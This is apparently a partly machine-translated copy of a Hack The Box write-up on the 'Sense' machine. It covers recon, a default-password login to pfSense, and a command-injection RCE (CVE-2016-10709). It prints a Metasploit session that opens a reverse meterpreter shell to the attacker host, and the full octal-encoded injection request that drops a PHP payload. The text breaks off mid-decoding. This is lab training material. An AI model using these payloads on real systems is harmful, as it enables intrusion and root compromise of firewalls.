cms pfsense RCE


# 健康代谢：感官

[0xdf.gitlab.io](https://0xdf.gitlab.io/2021/03/11/htb-sense.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fsense-cover.) 

Sense是我的笔记显示的一个盒子，我几乎正好在三年前解决了。这是一个简短的框，使用目录暴力强制查找具有用户凭据的文本文件，并使用这些凭据访问PF Sense防火墙。从那里，我将使用 Metasploit 利用代码注入来获取代码执行和外壳作为根。在《超越根》中，我将介绍一些我今天会以不同的方式做的事情。首先，我将展示Feroxbuster来执行反复出现的目录暴力破解，然后我将深入研究漏洞利用以及它是如何工作的，以及如何在没有Metasploit的情况下完成它。

## 箱子信息

名字

[意义](https://www.hackthebox.eu/home/machines/profile/111) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-sense.png) 

发行日期

21 10月 2017

停用日期

24 3月 2018

操作系统

免费宽带 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2FFreeBSD.png) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fsense-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fsense-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 02小时 53分 47秒。[![埃赫罗斯](https://image.cubox.pro/article/2022091818090260760/47952.jpg)](https://www.hackthebox.eu/home/users/profile/2846)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 02小时 47分钟 11秒。[![埃赫罗斯](https://image.cubox.pro/article/2022091818090260760/47952.jpg)](https://www.hackthebox.eu/home/users/profile/2846)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F709)](https://www.hackthebox.eu/home/users/profile/709)-

## 侦察

### n地图

初始 nmap 扫描仅显示端口 80 和 443，其中 80 重定向到 443：

    root@kali# mkdir nmap; nmap -sV -sC -oA nmap/initial -T5 10.10.10.60
    Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-07 17:42 EST
    Nmap scan report for 10.10.10.60
    Host is up (0.097s latency).
    Not shown: 998 filtered ports
    PORT    STATE SERVICE  VERSION
    80/tcp  open  http     lighttpd 1.4.35
    |_http-server-header: lighttpd/1.4.35
    |_http-title: Did not follow redirect to https://10.10.10.60/
    443/tcp open  ssl/http lighttpd 1.4.35
    |_http-server-header: lighttpd/1.4.35
    |_http-title: Login
    | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
    | Not valid before: 2017-10-14T19:21:35
    |_Not valid after:  2023-04-06T19:21:35                    
    |_ssl-date: TLS randomness does not represent time
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 29.09 seconds
    

I hadn’t figure out my go-to syntax for back then (first , then ). The web server is lighttpd. The certificate on TLS isn’t filled in with any information. I can look at it in Firefox and confirm it is just defaults:`nmap``-p- --min-rate 10000``-p [ports] -sCV`

[![image-20210310163104815](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210310163104815.png)](https://0xdf.gitlab.io/img/image-20210310163104815.png)

[_Click for full image_](https://0xdf.gitlab.io/img/image-20210310163104815.png)

### HTTPS - TCP 443

#### Site

The page is a pfsense login screen:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Flogin.png) 

The default creds for pfsense are admin/pfsense, but those don’t work.

#### Directory Brute Force

I started with gobuster (note the syntax has changed a bit since 2017):

    root@kali# gobuster -u https://10.10.10.60/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k
    
    Gobuster v1.4.1              OJ Reeves (@TheColonial)
    =====================================================
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : https://10.10.10.60/
    [+] Threads      : 10
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    [+] Status codes : 200,204,301,302,307
    =====================================================
    /themes (Status: 301)
    /css (Status: 301)
    /includes (Status: 301)
    /javascript (Status: 301)
    /classes (Status: 301)
    /widgets (Status: 301)
    /tree (Status: 301)
    /shortcuts (Status: 301)
    /installer (Status: 301)
    /wizards (Status: 301)
    /csrf (Status: 301)
    /filebrowser (Status: 301)
    =====================================================
    

Nothing exciting there.

I switched to another tool, , because in 2017, that was the best tool to recurrsively directory brute force, and I wanted to run a much more extensive brute force, looking in subdirectories and for more extensions. I kicked it off with the following:`dirbuster`

    root@kali# dirbuster -u https://10.10.10.60 -t 20 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r sense-10.10.10.60/dirbuster_dir-med -e php,txt,html
    

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fdirbuster.png) 

There are a couple interesting things here:

*   Anything of size 453 is a redirect to the login page.
*   `system-users.txt` is a good thing to checkout!

`system-users.txt` contains the following:

    ####Support ticket###
    
    Please create the following user
    
    
    username: Rohit
    password: company defaults
    

## Shell as root

### Access PFSense

The [default password on a PFSense](https://docs.netgate.com/pfsense/en/latest/usermanager/defaults.html) router is “pfsense”, and at the login screen, the credentials “rohit” / “pfsense” worked.

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210311101318041.png) 

Many of the endpoings in the web gui are not actually implemented. There’s nothing in the Interfaces, Firewall, Services, VPN, Diagnostics, or Help menus. System only has Logout. There is a full menu in Status:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210311101512285.png) 

Glancing through the various pages shows everything pretty empty / not configured.

### Exploits

`searchsploit` shows some exploits for the HTTP server, lighttpd, but all for older versions:

    root@kali#  searchsploit lighttpd
    ---------------------------------------------- ---------------------------------
     Exploit Title                                |  Path
    ---------------------------------------------- ---------------------------------
    lighttpd - Denial of Service (PoC)            | linux/dos/18295.txt
    Lighttpd 1.4.15 - Multiple Code Execution / D | windows/remote/30322.rb
    Lighttpd 1.4.16 - FastCGI Header Overflow Rem | multiple/remote/4391.c
    Lighttpd 1.4.17 - FastCGI Header Overflow Arb | linux/remote/4437.c
    lighttpd 1.4.31 - Denial of Service (PoC)     | linux/dos/22902.sh
    Lighttpd 1.4.x - mod_userdir Information Disc | linux/remote/31396.txt
    lighttpd 1.4/1.5 - Slow Request Handling Remo | linux/dos/33591.sh
    Lighttpd < 1.4.23 (BSD/Solaris) - Source Code | multiple/remote/8786.txt
    ---------------------------------------------- ---------------------------------  
    

On originally solving, I searched for PFSence exploits in Metasploit, and there were a couple::

    msf exploit(unix/http/pfsense_graph_injection_exec) > search pfsense
    
    Matching Modules
    ================
    
       Name                                            Disclosure Date  Rank       Description
       ----                                            ---------------  ----       -----------
       exploit/unix/http/pfsense_clickjacking          2017-11-21       normal     Clickjacking Vulnerability In CSRF Error Page pfSense
       exploit/unix/http/pfsense_graph_injection_exec  2016-04-18       excellent  pfSense authenticated graph status RCE
       exploit/unix/http/pfsense_group_member_exec     2017-11-06       excellent  pfSense authenticated group member RCE
    

The first one is a clickjacking exploit, which doesn’t seem useful to me. The next one is interesting, as it’s an injection into the graph function, which is implemented in this host:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2FRRDGraphs.png) 

### Metasploit

That metasploit exploit works to get a root shell, which can grab both flags:

    msf exploit(unix/http/pfsense_graph_injection_exec) > options
    
    Module options (exploit/unix/http/pfsense_graph_injection_exec):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       PASSWORD  pfsense          yes       Password to login with
       Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOST     10.10.10.60      yes       The target address
       RPORT     443              yes       The target port (TCP)
       SSL       true             no        Negotiate SSL/TLS for outgoing connections
       USERNAME  rohit            yes       User to login with
       VHOST                      no        HTTP server virtual host
    
    
    Payload options (php/meterpreter/reverse_tcp):
    
       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       LHOST  10.10.14.157     yes       The listen address
       LPORT  4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Automatic Target
    
    
    msf exploit(unix/http/pfsense_graph_injection_exec) > run
    
    [*] Started reverse TCP handler on 10.10.14.157:4444
    [*] Detected pfSense 2.1.3-RELEASE, uploading initial payload
    [*] Payload uploaded successfully, executing
    [*] Sending stage (37543 bytes) to 10.10.10.60
    [*] Meterpreter session 1 opened (10.10.14.157:4444 -> 10.10.10.60:9380) at 2018-03-08 07:12:27 -0500
    [+] Deleted Fdzln
    meterpreter >
    

I’ve never really been a master at , so I just dropped into a shell, and used Python to get a PTY:`meterpreter`

    meterpreter > shell
    Process 62566 created.
    Channel 0 created.
    python -c 'import pty;pty.spawn("/bin/sh")'
    # 
    

I won’t do the other half of the shell upgrade (, , , ), as that doesn’t work inside Metasploit. I can grab both flags:`bg``stty raw -echo``fg``reset`

    # whoami
    root
    
    # cat /home/rohit/user.txt
    8721327c************************
    # cat /root/root.txt
    d08c32a5************************
    

## Beyond Root - Things I Do Differently

### Brute Force

I rarely go looking for files in directory brute forces on HTB anymore, but that was much more common in older machines. I wouldn’t run today, but rather perhaps either more targeted (I didn’t actually need the recurrsion), or [feroxbuster](https://github.com/epi052/feroxbuster), a tool I’ve only recently started playing with that looks quite slick. For this example:`.txt``dirbuster``gobuster`

    oxdf@parrot$ feroxbuster -u https://10.10.10.60/ -x php,html,txt -w /usr/share/wordlists/d
    irbuster/directory-list-2.3-medium.txt -k -t 100
    
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.2.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ https://10.10.10.60/
     🚀  Threads               │ 100
     📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]      
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.2.1
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     💲  Extensions            │ [php, html, txt]
     🔓  Insecure              │ true
     🔃  Recursion Depth       │ 4
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    200      173l      425w        0c https://10.10.10.60/index.php
    200       24l       32w      329c https://10.10.10.60/index.html
    200      173l      425w        0c https://10.10.10.60/wizard.php
    301        0l        0w        0c https://10.10.10.60/csrf
    301        0l        0w        0c https://10.10.10.60/includes
    200      173l      425w        0c https://10.10.10.60/graph.php
    200      173l      425w        0c https://10.10.10.60/status.php
    200      173l      425w        0c https://10.10.10.60/interfaces.php
    200       10l       40w      271c https://10.10.10.60/changelog.txt
    200      173l      425w        0c https://10.10.10.60/exec.php
    301        0l        0w        0c https://10.10.10.60/filebrowser
    301        0l        0w        0c https://10.10.10.60/tree
    200        7l       12w      106c https://10.10.10.60/system-users.txt
    301        0l        0w        0c https://10.10.10.60/installer
    200      228l      851w     7492c https://10.10.10.60/tree/index.html
    301        0l        0w        0c https://10.10.10.60/classes 
    302        0l        0w        0c https://10.10.10.60/installer/index.php
    200      173l      425w        0c https://10.10.10.60/license.php
    200      173l      425w        0c https://10.10.10.60/help.php
    301        0l        0w        0c https://10.10.10.60/css
    301        0l        0w        0c https://10.10.10.60/themes
    200      173l      425w        0c https://10.10.10.60/reboot.php
    200      173l      425w        0c https://10.10.10.60/edit.php
    200      173l      425w        0c https://10.10.10.60/stats.php
    403       11l       26w      345c https://10.10.10.60/%7Echeckout%7E
    403       11l       26w      345c https://10.10.10.60/csrf/%7Echeckout%7E
    200      173l      404w        0c https://10.10.10.60/installer/installer.php
    403       11l       26w      345c https://10.10.10.60/filebrowser/%7Echeckout%7E
    403       11l       26w      345c https://10.10.10.60/tree/%7Echeckout%7E
    403       11l       26w      345c https://10.10.10.60/classes/%7Echeckout%7E
    403       11l       26w      345c https://10.10.10.60/installer/%7Echeckout%7E
    200      173l      425w        0c https://10.10.10.60/filebrowser/browser.php
    403       11l       26w      345c https://10.10.10.60/css/%7Echeckout%7E
    403       11l       26w      345c https://10.10.10.60/themes/%7Echeckout%7E
    [####################] - 1h   23818860/23818860 0s      found:34      errors:670965 
    [####################] - 32m   882180/882180  454/s   https://10.10.10.60/
    [####################] - 36m   882180/882180  399/s   https://10.10.10.60/csrf
    [####################] - 35m   882180/882180  411/s   https://10.10.10.60/includes
    [####################] - 44m   882180/882180  329/s   https://10.10.10.60/filebrowser
    [####################] - 44m   882180/882180  333/s   https://10.10.10.60/tree
    [####################] - 45m   882180/882180  324/s   https://10.10.10.60/installer
    [####################] - 44m   882180/882180  331/s   https://10.10.10.60/classes
    [####################] - 40m   882180/882180  367/s   https://10.10.10.60/css
    [####################] - 39m   882180/882180  367/s   https://10.10.10.60/themes
    

It took a while to run, but found 34 files in the root and eight additional folders. This is a really nice enumeration to have going in the background.

### Exploit

There’s nothing wrong with using Metasploit, but I’ve made a habit since originally solving this box of typically not using it. That’s both useful to people prepping for the OSCP, and it allows me to understand what’s actually happening when the exploit is run, which is how I learn, which is why I’m here in the first place.

Some Googling today for the CVE (always in quotes like or Google will return others) led to \[this page\] which contains a writeup of the exploit.`"CVE-2016-10709"`

>     The status_rrd_graph_img.php page is vulnerable to command injection via
>     the graph GET parameter. A non-administrative authenticated attacker
>     having access privileges to the graph status functionality can inject
>     arbitrary operating system commands and execute them in the context of
>     the root user. Although input validation is performed on the graph
>     parameter through a regular expression filter, the pipe character is not
>     removed. Octal characters sequences can be used to encode a payload,
>     bypass the filter for illegal characters, and create a PHP file to
>     download and execute a malicious file (i.e. reverse shell) from a remote
>     attacker controlled host.
>     

A good skill to work on is reading the [MSF exploit source](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/unix/http/pfsense_graph_injection_exec.rb) to get a feel for what’s it’s doing. Another option is to run the exploit from MSF through Burp or with Wireshark on (though TLS in this case makes Burp the way to go).

If I set up the exploit like above, and then add two more options, it will send the requests through Burp:

    msf6 exploit(unix/http/pfsense_graph_injection_exec) > set proxies http:127.0.0.1:8000
    proxies => http:127.0.0.1:8000
    msf6 exploit(unix/http/pfsense_graph_injection_exec) > set ReverseAllowProxy true
    ReverseAllowProxy => true
    

The exploit sends five requests:

1.  GET to get the CSRF token.`index.php`
2.  POST to login using the provided creds, and the CSRF from 1.`index.php`
3.  GET following the 302 redirect on successful login in 2.`index.php`
4.  GET with a long payload (mostly in octal) in the parameter.`status_rrd_graph_img.php``graph`
5.  GET with a short payload in .`status_rrd_graph_img.php``graph`

Looking at 4, the GET request looks like:

    GET /status_rrd_graph_img.php?database=-throughput.rrd&graph=file%7cprintf%20%27\145\143\150\157\40\47\74\77\160\150\160\40\145\166\141\154\50\142\141\163\145\66\64\137\144\145\143\157\144\145\50\132\130\132\150\142\103\150\151\131\130\116\154\116\152\122\146\132\107\126\152\142\62\122\154\113\105\170\65\142\172\150\121\115\60\112\166\131\60\116\102\144\153\164\160\142\63\132\112\122\61\132\65\131\62\60\65\145\126\147\172\123\155\170\152\122\172\154\65\132\105\144\163\144\126\160\65\132\63\144\114\126\110\116\156\123\153\144\163\144\60\154\105\115\107\144\113\145\153\126\63\124\107\160\106\144\60\170\161\122\124\102\115\141\153\126\63\123\156\160\172\132\60\160\111\121\156\132\152\142\154\106\156\125\106\116\102\115\105\65\105\125\124\102\120\145\125\112\167\127\155\154\102\142\60\164\104\125\155\61\112\122\104\102\156\123\152\116\117\115\107\116\164\126\155\150\151\126\152\154\66\131\152\112\117\143\154\160\131\125\155\132\132\115\156\150\167\127\154\143\61\115\105\160\65\141\62\144\113\141\126\154\156\131\126\150\117\132\154\153\171\122\156\116\151\122\60\132\160\131\153\144\126\142\60\160\110\127\130\102\114\125\60\111\63\123\125\116\123\145\153\154\105\115\107\144\113\122\61\154\166\123\127\65\123\141\155\116\105\142\63\132\115\115\63\116\162\131\126\150\103\117\125\71\165\143\62\164\152\122\172\154\65\132\105\147\167\141\125\164\125\143\62\144\113\123\105\65\155\132\105\150\163\144\61\160\124\121\124\154\112\121\62\122\66\132\105\150\113\142\106\154\130\115\107\65\120\145\125\111\65\123\125\144\163\142\125\154\104\132\62\150\113\123\105\61\156\123\155\154\132\132\60\164\104\125\155\61\112\122\104\102\156\123\152\112\141\145\155\111\171\124\156\112\151\115\60\112\163\131\155\154\152\143\105\154\104\127\127\61\112\122\62\170\66\127\104\112\117\141\107\112\110\145\107\150\132\142\130\150\163\123\60\116\123\142\125\164\124\141\62\144\154\145\125\106\162\131\63\154\102\117\125\154\104\125\155\61\114\121\61\112\167\131\60\116\63\132\60\160\111\121\156\132\152\142\154\106\167\124\63\154\102\141\62\115\170\117\124\102\154\127\105\112\163\123\125\121\167\132\60\157\172\124\152\102\152\142\126\132\157\131\154\116\152\116\60\154\111\115\107\144\150\126\61\154\156\123\60\116\106\141\62\116\65\121\127\61\113\141\125\106\166\123\153\144\132\132\61\102\124\121\127\65\152\115\152\154\161\131\124\112\127\115\106\147\171\124\156\154\141\126\60\131\167\127\154\116\152\143\105\154\104\127\127\61\112\122\62\170\66\127\104\112\117\141\107\112\110\145\107\150\132\142\130\150\163\123\60\116\123\142\125\164\124\141\62\144\154\145\125\106\162\131\63\154\102\117\125\154\104\125\155\61\114\122\125\132\110\127\104\102\163\124\61\112\127\125\130\116\112\122\153\65\121\125\124\102\60\132\154\125\170\125\154\116\123\126\125\132\117\124\105\116\103\126\106\121\167\145\107\132\127\122\125\65\122\123\61\122\172\132\60\160\111\123\155\170\152\145\125\105\65\123\125\126\103\145\155\111\171\124\156\112\141\127\106\112\155\127\124\111\65\144\127\112\164\126\155\160\153\121\62\144\162\131\63\154\63\132\60\160\110\142\110\144\115\121\60\106\162\131\60\143\65\145\127\122\104\141\172\144\112\122\62\170\164\123\125\116\156\141\105\160\111\123\155\170\152\145\127\164\156\132\130\154\103\141\62\106\130\126\127\71\114\126\110\116\156\132\154\116\102\141\62\115\170\117\124\102\154\127\105\112\163\123\125\121\167\132\60\157\172\124\156\132\132\115\156\122\163\132\105\116\152\116\60\154\111\115\107\144\150\126\61\154\156\123\60\116\106\141\62\115\170\117\124\102\154\127\105\112\163\123\61\116\103\116\60\154\110\125\156\102\141\125\62\144\165\131\155\60\64\132\62\115\171\117\127\160\150\115\154\131\167\123\125\144\141\115\127\112\164\124\156\160\113\145\127\163\63\56\123\125\147\167\132\62\106\130\127\127\144\114\121\60\126\162\131\63\154\162\132\62\126\65\121\155\164\150\126\61\126\166\123\152\111\61\144\153\154\111\124\156\132\132\115\156\122\163\132\105\116\152\143\105\71\65\121\152\154\112\123\105\64\172\131\126\150\123\141\155\106\104\121\127\71\113\123\105\65\155\132\105\150\163\144\61\160\124\141\62\144\154\145\125\112\161\127\126\150\117\142\105\154\104\132\110\160\153\123\105\160\163\127\126\143\167\142\153\71\160\121\127\164\151\122\61\132\61\123\125\121\167\132\61\160\165\123\155\170\132\126\61\106\166\123\153\150\116\143\60\154\105\125\130\102\120\145\125\112\160\131\62\61\127\141\107\106\66\143\62\144\132\115\153\132\66\127\154\116\102\142\155\115\171\117\127\160\150\115\154\131\167\123\156\160\166\132\60\160\110\145\107\170\151\141\125\105\65\123\125\150\117\144\154\153\171\144\107\170\153\122\152\154\65\127\154\144\107\141\60\164\104\125\156\160\115\121\60\105\167\123\61\122\172\132\61\154\165\123\155\170\132\126\63\115\63\123\125\147\167\132\62\106\130\127\127\144\114\121\60\126\162\131\153\144\127\144\125\164\124\121\152\144\112\122\61\112\167\127\154\116\156\143\105\71\65\121\152\154\112\121\61\112\157\123\125\121\167\132\62\122\130\116\130\144\132\126\60\65\171\123\60\116\113\124\171\65\151\122\61\132\61\123\127\154\63\132\60\160\110\145\107\170\151\141\127\163\63\123\125\116\123\143\61\160\130\116\107\144\121\125\60\106\162\127\126\132\172\142\155\112\110\126\156\126\113\115\124\101\63\123\125\116\123\141\125\154\105\115\107\144\113\145\127\115\63\123\125\150\153\142\62\106\130\145\107\170\112\121\62\150\66\132\105\150\113\143\61\160\130\116\107\71\113\122\60\154\167\123\125\122\63\132\60\160\110\145\107\170\151\141\127\164\156\132\130\154\103\145\155\121\171\142\104\102\132\115\155\144\156\123\60\116\123\145\154\147\172\125\152\126\152\122\61\126\167\123\125\150\172\132\61\153\171\122\156\160\141\125\60\106\165\131\172\116\123\145\126\160\130\122\156\122\113\145\155\71\156\123\153\144\112\132\60\170\161\115\107\144\141\142\153\160\163\127\126\144\122\142\60\160\111\124\130\116\112\121\61\112\172\127\154\143\60\144\107\115\172\125\156\154\151\122\61\132\61\123\60\116\123\141\125\164\124\141\172\144\112\122\60\160\65\127\154\144\107\143\153\71\65\121\155\160\132\127\105\65\163\123\125\116\153\145\155\111\171\124\156\112\141\127\106\106\165\124\62\154\102\141\61\154\160\121\130\126\121\125\60\112\66\131\152\112\117\143\154\160\131\125\155\132\152\142\126\132\157\127\153\116\156\141\62\116\65\144\62\144\113\122\63\150\163\131\155\153\170\145\155\122\111\123\156\116\141\126\172\122\166\123\153\144\112\143\105\164\125\143\62\144\132\142\153\160\163\127\126\144\172\116\60\154\111\115\107\144\155\125\60\106\162\125\152\102\64\125\106\106\162\122\153\61\126\115\130\116\165\131\154\150\117\142\155\115\171\117\127\160\150\145\127\122\153\123\125\121\167\132\60\160\111\124\124\144\112\121\61\112\111\126\105\125\65\121\61\106\126\145\106\122\130\145\127\122\60\131\172\112\153\145\155\111\171\124\156\112\131\115\61\111\61\131\60\144\126\142\154\150\124\121\124\154\112\121\61\112\66\127\104\116\123\116\127\116\110\126\124\144\112\122\62\170\164\123\125\116\157\142\107\126\111\125\155\170\151\142\153\65\167\131\152\111\61\132\155\112\110\117\127\150\141\122\61\132\162\123\60\116\153\145\155\122\130\141\110\132\152\115\155\170\61\123\156\154\162\132\60\160\160\127\127\144\150\126\172\126\167\127\104\112\153\142\107\122\104\132\62\65\152\115\61\132\166\131\152\116\117\143\107\112\56\160\116\127\170\154\122\61\132\161\132\106\150\123\144\155\116\160\116\127\164\150\127\105\65\157\127\127\61\64\142\106\147\171\126\152\112\132\126\63\144\165\123\61\116\162\132\62\126\65\121\127\164\152\115\61\132\166\131\152\116\117\143\107\112\163\117\127\154\154\127\105\112\157\131\172\116\116\117\126\153\172\123\155\170\132\127\106\112\163\127\104\112\141\115\127\112\164\124\152\102\150\126\172\154\61\123\60\116\152\142\153\170\104\121\127\164\132\141\127\163\63\123\125\116\123\145\155\122\130\141\110\132\152\115\155\170\61\127\104\112\113\116\127\116\110\122\156\160\152\145\127\144\167\124\63\154\103\117\125\154\110\126\156\116\152\115\154\126\156\132\130\154\103\142\107\122\164\122\156\116\114\121\61\112\160\123\61\122\172\132\62\132\124\121\155\164\150\126\61\126\166\123\61\122\172\113\123\153\67\51\51\73\77\76\47\40\76\40\122\103\115\156\160\161\144%27%7csh%7cecho HTTP/1.1
    Host: 10.10.10.60
    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
    Cookie: PHPSESSID=83843109f2f66a131332333ab8c7e320;
    Connection: close
    

Removing the URL decoding, that’s:

    file|printf '\145\143\150\157\40\47...[snip]...\144'|sh|echo
    

So there’s a command running on the PFSence host that includes this, and the pipe sends the output (which I don’t care about) into the which ignores that output, prints the encoded stuff into . To figure out what it’s doing, I’ll just run the :`printf``sh``printf`

    oxdf@parrot$ printf '\145\143\150\157\40\47\74\77\160\150\160\40\145\166\141\154\50\142\141\163\145\66\64\137\144\145\143\157\144\145\50\132\130\132\150\142\103\150\151\131\130\116\154\116\152\122\146\132\107\126\152\142\62\122\154\113\105\170\65\142\172\150\121\115\60\112\166\131\60\116\102\144\153\164\160\142\63\132\112\122\61\132\65\131\62\60\65\145\126\147\172\123\155\170\152\122\172\154\65\132\105\144\163\144\126\160\65\132\63\144\114\126\110\116\156\123\153\144\163\144\60\154\105\115\107\144\113\145\153\126\63\124\107\160\106\144\60\170\161\122\124\102\115\141\153\126\63\123\156\160\172\132\60\160\111\121\156\132\152\142\154\106\156\125\106\116\102\115\105\65\105\125\124\102\120\145\125\112\167\127\155\154\102\142\60\164\104\125\155\61\112\122\104\102\156\123\152\116\117\115\107\116\164\126\155\150\151\126\152\154\66\131\152\112\117\143\154\160\131\125\155\132\132\115\156\150\167\127\154\143\61\115\105\160\65\141\62\144\113\141\126\154\156\131\126\150\117\132\154\153\171\122\156\116\151\122\60\132\160\131\153\144\126\142\60\160\110\127\130\102\114\125\60\111\63\123\125\116\123\145\153\154\105\115\107\144\113\122\61\154\166\123\127\65\123\141\155\116\105\142\63\132\115\115\63\116\162\131\126\150\103\117\125\71\165\143\62\164\152\122\172\154\65\132\105\147\167\141\125\164\125\143\62\144\113\123\105\65\155\132\105\150\163\144\61\160\124\121\124\154\112\121\62\122\66\132\105\150\113\142\106\154\130\115\107\65\120\145\125\111\65\123\125\144\163\142\125\154\104\132\62\150\113\123\105\61\156\123\155\154\132\132\60\164\104\125\155\61\112\122\104\102\156\123\152\112\141\145\155\111\171\124\156\112\151\115\60\112\163\131\155\154\152\143\105\154\104\127\127\61\112\122\62\170\66\127\104\112\117\141\107\112\110\145\107\150\132\142\130\150\163\123\60\116\123\142\125\164\124\141\62\144\154\145\125\106\162\131\63\154\102\117\125\154\104\125\155\61\114\121\61\112\167\131\60\116\63\132\60\160\111\121\156\132\152\142\154\106\167\124\63\154\102\141\62\115\170\117\124\102\154\127\105\112\163\123\125\121\167\132\60\157\172\124\152\102\152\142\126\132\157\131\154\116\152\116\60\154\111\115\107\144\150\126\61\154\156\123\60\116\106\141\62\116\65\121\127\61\113\141\125\106\166\123\153\144\132\132\61\102\124\121\127\65\152\115\152\154\161\131\124\112\127\115\106\147\171\124\156\154\141\126\60\131\167\127\154\116\152\143\105\154\104\127\127\61\112\122\62\170\66\127\104\112\117\141\107\112\110\145\107\150\132\142\130\150\163\123\60\116\123\142\125\164\124\141\62\144\154\145\125\106\162\131\63\154\102\117\125\154\104\125\155\61\114\122\125\132\110\127\104\102\163\124\61\112\127\125\130\116\112\122\153\65\121\125\124\102\60\132\154\125\170\125\154\116\123\126\125\132\117\124\105\116\103\126\106\121\167\145\107\132\127\122\125\65\122\123\61\122\172\132\60\160\111\123\155\170\152\145\125\105\65\123\125\126\103\145\155\111\171\124\156\112\141\127\106\112\155\127\124\111\65\144\127\112\164\126\155\160\153\121\62\144\162\131\63\154\63\132\60\160\110\142\110\144\115\121\60\106\162\131\60\143\65\145\127\122\104\141\172\144\112\122\62\170\164\123\125\116\156\141\105\160\111\123\155\170\152\145\127\164\156\132\130\154\103\141\62\106\130\126\127\71\114\126\110\116\156\132\154\116\102\141\62\115\170\117\124\102\154\127\105\112\163\123\125\121\167\132\60\157\172\124\156\132\132\115\156\122\163\132\105\116\152\116\60\154\111\115\107\144\150\126\61\154\156\123\60\116\106\141\62\115\170\117\124\102\154\127\105\112\163\123\61\116\103\116\60\154\110\125\156\102\141\125\62\144\165\131\155\60\64\132\62\115\171\117\127\160\150\115\154\131\167\123\125\144\141\115\127\112\164\124\156\160\113\145\127\163\63\56\123\125\147\167\132\62\106\130\127\127\144\114\121\60\126\162\131\63\154\162\132\62\126\65\121\155\164\150\126\61\126\166\123\152\111\61\144\153\154\111\124\156\132\132\115\156\122\163\132\105\116\152\143\105\71\65\121\152\154\112\123\105\64\172\131\126\150\123\141\155\106\104\121\127\71\113\123\105\65\155\132\105\150\163\144\61\160\124\141\62\144\154\145\125\112\161\127\126\150\117\142\105\154\104\132\110\160\153\123\105\160\163\127\126\143\167\142\153\71\160\121\127\164\151\122\61\132\61\123\125\121\167\132\61\160\165\123\155\170\132\126\61\106\166\123\153\150\116\143\60\154\105\125\130\102\120\145\125\112\160\131\62\61\127\141\107\106\66\143\62\144\132\115\153\132\66\127\154\116\102\142\155\115\171\117\127\160\150\115\154\131\167\123\156\160\166\132\60\160\110\145\107\170\151\141\125\105\65\123\125\150\117\144\154\153\171\144\107\170\153\122\152\154\65\127\154\144\107\141\60\164\104\125\156\160\115\121\60\105\167\123\61\122\172\132\61\154\165\123\155\170\132\126\63\115\63\123\125\147\167\132\62\106\130\127\127\144\114\121\60\126\162\131\153\144\127\144\125\164\124\121\152\144\112\122\61\112\167\127\154\116\156\143\105\71\65\121\152\154\112\121\61\112\157\123\125\121\167\132\62\122\130\116\130\144\132\126\60\65\171\123\60\116\113\124\171\65\151\122\61\132\61\123\127\154\63\132\60\160\110\145\107\170\151\141\127\163\63\123\125\116\123\143\61\160\130\116\107\144\121\125\60\106\162\127\126\132\172\142\155\112\110\126\156\126\113\115\124\101\63\123\125\116\123\141\125\154\105\115\107\144\113\145\127\115\63\123\125\150\153\142\62\106\130\145\107\170\112\121\62\150\66\132\105\150\113\143\61\160\130\116\107\71\113\122\60\154\167\123\125\122\63\132\60\160\110\145\107\170\151\141\127\164\156\132\130\154\103\145\155\121\171\142\104\102\132\115\155\144\156\123\60\116\123\145\